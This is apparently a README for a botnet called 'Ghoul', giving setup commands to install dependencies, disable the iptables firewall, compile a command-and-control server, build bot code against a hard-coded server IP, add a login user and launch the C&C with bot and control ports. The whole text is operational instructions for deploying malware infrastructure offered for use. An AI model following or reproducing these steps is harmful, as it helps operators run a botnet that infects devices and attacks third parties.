# Ghoul
Put server Ip in bot_ghoul.c						 

yum install python-paramiko nano screen gcc perl wget lbzip unzip -y

service httpd restart 
service iptables stop

gcc cnc.c -o server -pthread

python Ghoul.py bot_ghoul.c 157.245.187.85 <---- Server IP

echo Edo Edo >>User_Info.txt

screen ./server [botport] [threads] [cncport]
